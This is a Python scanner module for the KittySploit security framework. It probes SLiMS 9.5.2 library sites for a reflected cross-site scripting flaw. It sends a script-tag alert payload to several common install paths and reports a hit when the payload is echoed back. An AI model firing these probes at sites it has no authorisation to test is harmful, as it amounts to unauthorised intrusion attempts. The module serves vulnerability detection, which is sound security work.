#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SLiMS 9."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Senayan Library Management System v9.5.2 (Bulian) - Cross-Site Scripting Detection',
        'description': 'SLiMS 9.5.2 (Bulian) vulnerable to Cross-Site Scripting in index.php. When injected, website will execute the payload repeatedly',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'vulnerability', 'senayan', 'xss', 'slims', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 6,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': ['https://github.com/slims/slims9_bulian/issues/185'],
    }

    def run(self):
        for path in ('/index.php/%22--%3E<script>alert(document.domain)</script>/index.php', '/perpustakaan/index.php/%22--%3E<script>alert(document.domain)</script>/index.php', '/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php', '/perpustakaan/slims/index.php/%22--%3E<script>alert(document.domain)</script>/index.php', '/e-library/index.php/%22--%3E<script>alert(document.domain)</script>/index.php', '/perpus/index.php/%22--%3E<script>alert(document.domain)</script>/index.php', '/digilib/index.php/%22--%3E<script>alert(document.domain)</script>/index.php', '/bulian/index.php/%22--%3E<script>alert(document.domain)</script>/index.php'):
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
            body_all = ('<script>alert(document.domain)</script>', 'SLiMS', 'name="author',)
            ctype_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in content_type for m in ctype_any)):
                self.set_info(
                    severity='medium',
                    reason='Senayan Library Management System v9.5.2 (Bulian) - Cross-Site Scripting detected',
                    path=path,
                )
                return True
        return False

